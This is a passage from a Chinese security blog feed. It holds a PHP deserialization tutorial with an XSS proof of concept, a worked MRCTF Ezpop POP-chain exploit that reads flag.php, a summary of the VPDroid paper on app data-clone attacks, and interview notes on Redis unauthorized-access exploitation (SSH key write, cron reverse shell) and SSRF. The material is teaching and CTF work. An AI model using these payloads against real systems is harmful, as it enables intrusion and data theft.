class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new</span>[<span class="string">&#x27;age&#x27;</span>];</span><br></pre></td></tr></table></figure><p>正常情况传入<code>name=mao&amp;age=11</code>的结果<br><img src="/2024/09/10/WebSecurity/owasptop/deserialization/image-4.png"><br>构造payload，由于前面是40个x所以导致少了20个字符，所以需要后面来补上，<code>&quot;;s:3:&quot;age&quot;;s:28:&quot;11</code>这一部分刚好20个，后面的<code>&quot;</code>闭合了前面的参数，就可以实现自定义执行了。<br><img src="/2024/09/10/WebSecurity/owasptop/deserialization/image-5.png"></p><h2 id="PHP原生类反序列化利用"><a href="#PHP原生类反序列化利用" class="headerlink" title="PHP原生类反序列化利用"></a><a href="https://blog.csdn.net/qq_53287512/article/details/123879744">PHP原生类反序列化利用</a></h2><p>PHP原生类中存在很多魔术方法的使用，可以利用这些原生类构造POP链。<br>可以用下面的脚本来查看原生类中哪些方法可以被调用   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个简单的小例子看下如何利用。有如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p>构造POC如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>可以实现xss，虽然原来的代码中没有什么类可以利用，但利用原生类可以实现</p><h2 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h2><p><a href="https://blog.csdn.net/jayq1/article/details/131858372">CTF中的反序列化</a></p><h3 id="「MRCTF2020」-Ezpop"><a href="#「MRCTF2020」-Ezpop" class="headerlink" title="「MRCTF2020」- Ezpop"></a>「MRCTF2020」- Ezpop</h3><p>打开页面后出现下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要想让上面的代码显示出flag，可以注意到Modifier中的include，这个可以利用PHP文件包含漏洞实现，但是要怎么才能执行呢，继续往下看<br>题目中有很多的魔术方法，从可控的入口出发一一总结在下面</p><ul><li>@unserialize 在反序列化时会自动调用 __wakeup 方法，判断Show类应当是入口</li><li>_wakeup 中 有 <code>preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)</code>，这里将 <code>$this-&gt;source</code> 当做字符串处理会触发 __toString 方法</li><li>__toString 方法中，访问属性source <code>$this-&gt;str-&gt;source</code> ，如果source不存在就会调用 <code>__get</code> ，所以这里的 $this-&gt;str 应当为 Test 类</li><li>__get 方法中，调用 <code>$function()</code> ，这里 p 应当为 Modifier 类，将类当做函数调用，会自动调用 __invoke 方法</li></ul><p>明白了POP链的构造，就可以利用伪协议构造出下面的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;karsa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;str-&gt;p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload后，访问<code>?pop=</code>，即可得到flag。<br>注* 使用 “php:&#x2F;&#x2F;filter”伪协议” 来进行包含。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。</p><h2 id="实战漏洞分析"><a href="#实战漏洞分析" class="headerlink" title="实战漏洞分析"></a>实战漏洞分析</h2><h3 id="Laravel-RCE（CVE-2021-3129"><a href="#Laravel-RCE（CVE-2021-3129" class="headerlink" title="Laravel RCE（CVE-2021-3129"></a>Laravel RCE（CVE-2021-3129</h3><p><a href="https://www.freebuf.com/vuls/280508.html">https://www.freebuf.com/vuls/280508.html</a></p><h3 id="Laravel-v11-x-CVE-2024-40075"><a href="#Laravel-v11-x-CVE-2024-40075" class="headerlink" title="Laravel v11.x (CVE-2024-40075)"></a>Laravel v11.x (CVE-2024-40075)</h3><p><a href="https://xz.aliyun.com/t/15127?time__1311=GqjxuQD=omwxlxGgx+xCqiKbn7wG8U3feD">https://xz.aliyun.com/t/15127?time__1311=GqjxuQD%3DomwxlxGgx%2BxCqiKbn7wG8U3feD</a></p><h3 id="CVE-2020-15148-Yii2"><a href="#CVE-2020-15148-Yii2" class="headerlink" title="CVE-2020-15148 Yii2"></a>CVE-2020-15148 Yii2</h3><p><a href="https://www.cnblogs.com/Aurora-M/p/15659232.html">https://www.cnblogs.com/Aurora-M/p/15659232.html</a></p><h3 id="CVE-2018-18753-Typecho"><a href="#CVE-2018-18753-Typecho" class="headerlink" title="CVE-2018-18753 Typecho"></a>CVE-2018-18753 Typecho</h3><p><a href="https://www.cnblogs.com/wuhongbin/p/15526142.html">https://www.cnblogs.com/wuhongbin/p/15526142.html</a></p><h3 id="CVE-2019-6340"><a href="#CVE-2019-6340" class="headerlink" title="CVE-2019-6340"></a>CVE-2019-6340</h3><p><a href="https://blog.csdn.net/shelter1234567/article/details/135187595">https://blog.csdn.net/shelter1234567/article/details/135187595</a></p><h3 id="phpBB-Phar-CVE-2018-19274"><a href="#phpBB-Phar-CVE-2018-19274" class="headerlink" title="phpBB Phar CVE-2018-19274"></a>phpBB Phar CVE-2018-19274</h3><p><a href="https://xz.aliyun.com/t/8239">https://xz.aliyun.com/t/8239</a></p><h3 id="CVE-2022-30287-Horde-Webmail"><a href="#CVE-2022-30287-Horde-Webmail" class="headerlink" title="CVE-2022-30287 Horde Webmail"></a>CVE-2022-30287 Horde Webmail</h3><p><a href="https://www.ctfiot.com/45607.html">https://www.ctfiot.com/45607.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【论文精读】App’s Auto-Login Function Security Testing via Android OS-Level Virtualization</title>
      <link href="/2024/09/10/PaperReading/Auto-Login/"/>
      <url>/2024/09/10/PaperReading/Auto-Login/</url>
      
        <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>本文研究的问题是APP账号自动登录，首先刚看到题目我以为是那种手机上都会有自动输入账号密码的机制，读了文章之后了解到这里说的自动登录是登录状态的保持，比如微信，我们只需要在刚下载微信时输入账号密码进行登录，之后每次即便是关掉微信进程，也是一打开就是自动登录的，这也就省去了用户频繁输入账号和口令的麻烦。然而，在实际使用中，它易受到“data-clone attack”的威胁： 如果自动登录依赖的数据存储在本地，它可能会被攻击者克隆，导致攻击者可以突破登录设备数量限制或秘密登录受害者的帐户，从而损害APP运营者的合法权益或侵犯用户隐私和数据安全。对此，业界提出了设备一致性检查方案，只要发现APP运行设备环境发生变化，APP将禁止自动登录进而阻止克隆攻击。针对该问题，本文进一步研究发现该方案无法完全防御“data-clone attack”。该团队提出了一个具有良好透明性的虚拟化方案VPDroid， 可定制攻击所需的设备环境，以进行App自动登录的安全测试。该研究对应用市场中234个主流APP进行了测试，结果表明，通过VPDroid可有效绕过被测APP的一致性检查机制。在该成果的研究过程中，该团队发现了系列安全漏洞，近20个厂商对提交的漏洞给予了确认（其中包括1个CVE和近10项CNVD漏洞成果）。</p><p>具体什么是自动登录呢，如下图是我在作者的另一篇论文中找到的图片，可以看到当前已有设备登录账号，在另一手机登陆时会弹出仅能登录一个设备的提示。在安卓手机中，app通常使用用户登录凭证来实现自动登录，在首次登录成功之后，app将凭证数据保存在本地存储当中，下次登陆前进行验证，安卓提供了四种存储机制包括内部存储、外部存储、共享存储、数据库存储。相应的app数据会存储在对应路径当中，一般其它的应用是无法访问的。要实现克隆的话不仅需要克隆应用本身资源，为了防止这样的克隆行为，业界的解决方案是检查设备一致性，如设备电话号、序列号等信息，此类行为可能可以使用Xposed等框架hook相关函数进行绕过，但很多app也会有反调试措施，而且之前的相关工作当中仅hook了13个相关的标识信息，但本文通过调研发现了103个有关设备标识的信息。</p><p>本文通过定制了一个安卓虚拟机系统来实现了对设备标识的定制化修改，该修改对于app来说是透明的。Cells是一个轻量的安卓虚拟机系统，可以直接与硬件进行交互，他的主要机制是创建了一个独立的虚拟机命名空间，以此实现同真机系统的隔离，以及不同系统间的隔离，但是Cells也有很多局限性，它的灵活性弱，对新版本的安卓系统并不支持，同时缺少对蓝牙、GPS等设备的支持，而且对于app来说，可以发现Cells虚拟机的指纹信息，也就是说可以发现当前设备是虚拟机。</p><p>本文在Cells的基础上进行定制化，为了实现对app克隆的攻击模型，虚拟机需要满足两个条件，第一点是需要直接能够接触到硬件，第二点是可以定制化系统参数并且对app而言该操作是透明的。为了实现这些目标，本文主要采取两个方式，首先是针对在安卓ServiceManager中定义的服务，采用binder机制进行通信，binder机制是安卓系统引入的进程间通信的一种机制。第二种方法是，对于没有在ServiceManager中定义的服务，采用和真机交互的方式，设置通信代理。（RIL是一种和电话运营商网络交互的功能接口，RILD是在C++层的接口）</p><p>VPDroid系统整体概况图如图所示，虚拟出的安卓设备独立于主机，并可实现其中的参数定制。</p><p>那么怎么具体实现参数定制化呢，VPDroid提供了一个定制文件，修改其中的文件信息便可实现定制，对于安卓系统的参数信息，只需要将其中定制信息初始化在虚拟机内存中即可，对于用户层和内核层的定制化，则需要将其初始化在真机内存中。</p><p>本文采用了应用商店排名靠前的234个应用进行实验，在VPDroid中所有app都能实现绕过，作者也提出了建议，不要将认证凭证保存在本地、或者采用可信执行环境，但这样的开销也会加大，影响用户体验，本文最后也指出了VPDroid对于经root的用户来说还不是透明的，因为在采用代理通信时，VPDroid并未直接与RILD通信，也存在有相应的指纹信息。</p><h2 id="Professional-term"><a href="#Professional-term" class="headerlink" title="Professional term"></a>Professional term</h2><ul><li>original equipment manufacturer (OEM)（原始设备生产商）：</li><li>app克隆：深入挖掘APP克隆实验 - FreeBuf网络安全行业门户 Android 手机克隆&#x2F;一键换机原理初探_IT先森的博客-CSDN博客_手机克隆原理</li><li>Binder：安卓中进程间通信的一种机制 SourceAnalysis-1&#x2F;Binder源码分析.md at master · VPDroid&#x2F;SourceAnalysis-1 (github.com)</li><li>SELinux：SELinux 属于MAC的具体实现，增强了Linux系统的安全性。MAC机制的特点在于，资源的拥有者，并不能决定谁可以接入到资源。具体决定是否可以接入到资源，是基于安全策略。而安全策略则是有一系列的接入规则组成，并仅有特定权限的用户有权限操作安全策略</li><li>Android RIL概述：和电话运营商网络交互的功能接口Android RIL概述-CSDN博客</li></ul><h2 id="Thesaurus"><a href="#Thesaurus" class="headerlink" title="Thesaurus"></a>Thesaurus</h2><ul><li>client-side tampering vulnerabilities（客户端篡改漏洞）：In this paper, we focus on the security risk caused by mobile apps’ auto-login functions, which belongs to client-side tampering vulnerabilities.</li><li>hassle（麻烦）：It avoids the hassle of retyping user ID and password in a small keyboard when reaccessing the app.</li><li>In a nutshell（简而言之）：In a nutshell, we make the following three significant contributions.</li><li>backends（后端）：They exploit an entire class of apps that only rely on device-public information to authenticate the user to their backends.</li><li>seamlessly（无缝地）：For example, Smart Switch can seamlessly transfer app private data and home layouts between Galaxy devices, and it is similar for other OEM-made clone apps.</li><li>jeopardy（危险）：As a result, the user’s sensitive data will be in jeopardy without raising suspicion.</li><li>citation（引文）：The citation [19] provides more details to advocate the subscription-based app economy. For the smart home apps, we also purchase related smart home devices, including one smart lock, two security - cameras, and one smart light bulb, to test whether we can control them after launching a data-clone attack.</li><li>imperceptible（察觉不到的）：User-mode apps in the VP are imperceptible to the change of device; this requires our virtualization and device-attribute customization functions are invisible to user-mode apps running in - the VP.</li><li>proprietary（特有的，专有的）：some hardware vendors provide proprietary software</li><li>pseudo（假的）：The Binder driver is a custom pseudo driver with no corresponding physical device.</li><li>To the best of our knowledge（据我们所知）：To the best of our knowledge, VPDroid offers the most comprehensive Android device-attribute editing options so far.</li></ul><h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><p>GitHub - VPDroid&#x2F;Dev: VPDroid is a lightweight Android OS-level virtualization architecture</p><p>​</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文精读 </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【工作】面试题整理 应用安全等</title>
      <link href="/2024/03/03/work/workpre1/"/>
      <url>/2024/03/03/work/workpre1/</url>
      
        <content type="html"><![CDATA[<h2 id="应用安全岗位"><a href="#应用安全岗位" class="headerlink" title="应用安全岗位"></a>应用安全岗位</h2><hr><h3 id="Redis-未授权访问漏洞如何入侵利用？"><a href="#Redis-未授权访问漏洞如何入侵利用？" class="headerlink" title="Redis 未授权访问漏洞如何入侵利用？"></a>Redis 未授权访问漏洞如何入侵利用？</h3><h2 id="漏洞原理：Redis-默认监听在-6379-端口，若未设置密码或绑定特定-IP，攻击者可直接访问。利用方式：-写入-SSH-公钥：利用-CONFIG-SET-命令修改配置，设置持久化目录为-root-ssh-，文件名为-authorized-keys，然后使用-SET-命令写入公钥，最终通过-SSH-登录目标服务器。-反弹-Shell：通过-CONFIG-SET-命令修改持久化目录为-var-spool-cron-，文件名为-root，内容为反向-shell-命令，保存后触发定时任务执行，获取远程-shell。修复方案：-设置密码：在-redis-conf-中配置-requirepass-，启用密码认证。-绑定-IP：在-redis-conf-中配置-bind-127-0-0-1，限制仅本地访问。-防火墙限制：使用防火墙规则限制对-6379-端口的访问，仅允许可信-IP。-禁用危险命令：在-redis-conf-中使用-rename-command-禁用或重命名高危命令，如-CONFIG、FLUSHDB-等。"><a href="#漏洞原理：Redis-默认监听在-6379-端口，若未设置密码或绑定特定-IP，攻击者可直接访问。利用方式：-写入-SSH-公钥：利用-CONFIG-SET-命令修改配置，设置持久化目录为-root-ssh-，文件名为-authorized-keys，然后使用-SET-命令写入公钥，最终通过-SSH-登录目标服务器。-反弹-Shell：通过-CONFIG-SET-命令修改持久化目录为-var-spool-cron-，文件名为-root，内容为反向-shell-命令，保存后触发定时任务执行，获取远程-shell。修复方案：-设置密码：在-redis-conf-中配置-requirepass-，启用密码认证。-绑定-IP：在-redis-conf-中配置-bind-127-0-0-1，限制仅本地访问。-防火墙限制：使用防火墙规则限制对-6379-端口的访问，仅允许可信-IP。-禁用危险命令：在-redis-conf-中使用-rename-command-禁用或重命名高危命令，如-CONFIG、FLUSHDB-等。" class="headerlink" title="漏洞原理：Redis 默认监听在 6379 端口，若未设置密码或绑定特定 IP，攻击者可直接访问。利用方式：- 写入 SSH 公钥：利用 CONFIG SET 命令修改配置，设置持久化目录为 /root/.ssh/，文件名为 authorized_keys，然后使用 SET 命令写入公钥，最终通过 SSH 登录目标服务器。- 反弹 Shell：通过 CONFIG SET 命令修改持久化目录为 /var/spool/cron/，文件名为 root，内容为反向 shell 命令，保存后触发定时任务执行，获取远程 shell。修复方案：- 设置密码：在 redis.conf 中配置 requirepass &lt;password&gt;，启用密码认证。- 绑定 IP：在 redis.conf 中配置 bind 127.0.0.1，限制仅本地访问。- 防火墙限制：使用防火墙规则限制对 6379 端口的访问，仅允许可信 IP。- 禁用危险命令：在 redis.conf 中使用 rename-command 禁用或重命名高危命令，如 CONFIG、FLUSHDB 等。"></a><strong>漏洞原理</strong>：Redis 默认监听在 6379 端口，若未设置密码或绑定特定 IP，攻击者可直接访问。<br><strong>利用方式</strong>：<br>- <strong>写入 SSH 公钥</strong>：利用 <code>CONFIG SET</code> 命令修改配置，设置持久化目录为 <code>/root/.ssh/</code>，文件名为 <code>authorized_keys</code>，然后使用 <code>SET</code> 命令写入公钥，最终通过 SSH 登录目标服务器。<br>- <strong>反弹 Shell</strong>：通过 <code>CONFIG SET</code> 命令修改持久化目录为 <code>/var/spool/cron/</code>，文件名为 <code>root</code>，内容为反向 shell 命令，保存后触发定时任务执行，获取远程 shell。<br><strong>修复方案</strong>：<br>- <strong>设置密码</strong>：在 <code>redis.conf</code> 中配置 <code>requirepass &lt;password&gt;</code>，启用密码认证。<br>- <strong>绑定 IP</strong>：在 <code>redis.conf</code> 中配置 <code>bind 127.0.0.1</code>，限制仅本地访问。<br>- <strong>防火墙限制</strong>：使用防火墙规则限制对 6379 端口的访问，仅允许可信 IP。<br>- <strong>禁用危险命令</strong>：在 <code>redis.conf</code> 中使用 <code>rename-command</code> 禁用或重命名高危命令，如 <code>CONFIG</code>、<code>FLUSHDB</code> 等。</h2><h3 id="SSRF-漏洞原理、利用方式及修复方案？Java-和-PHP-的-SSRF-区别？"><a href="#SSRF-漏洞原理、利用方式及修复方案？Java-和-PHP-的-SSRF-区别？" class="headerlink" title="SSRF 漏洞原理、利用方式及修复方案？Java 和 PHP 的 SSRF 区别？"></a>SSRF 漏洞原理、利用方式及修复方案？Java 和 PHP 的 SSRF 区别？</h3><h2 id="漏洞原理：SSRF（Server-Side-Request-Forgery）漏洞允许攻击者构造请求，由服务器发起，访问内部或外部服务。利用方式：-访问内网服务：通过构造请求访问内部服务，如-http-127-0-0-1-5000-admin，获取敏感信息。-探测元数据服务：访问云服务的元数据接口，如-AWS-的-http-169-254-169-254-latest-meta-data-，获取实例信息。-反弹-Shell：利用支持的协议（如-gopher）构造请求，反向连接攻击者主机，获取远程-shell。Java-和-PHP-的-SSRF-区别：-Java：HttpURLConnection、Apache-HttpClient-等类默认支持多种协议，可能被用于-SSRF-攻击。Java通常使用如HttpClient等库发起请求，需要特别注意库的配置以避免SSRF漏洞。-PHP：file-get-contents、cURL-等函数可用于发起请求，需注意协议限制。修复方案：-协议白名单：限制请求协议，仅允许-HTTP-和-HTTPS。-输入验证：严格验证用户输入的-URL，防止非法请求。-防火墙限制：使用防火墙规则限制对内部服务的访问。-云元数据防护：在云环境中，使用防火墙规则限制对元数据服务的访问。"><a 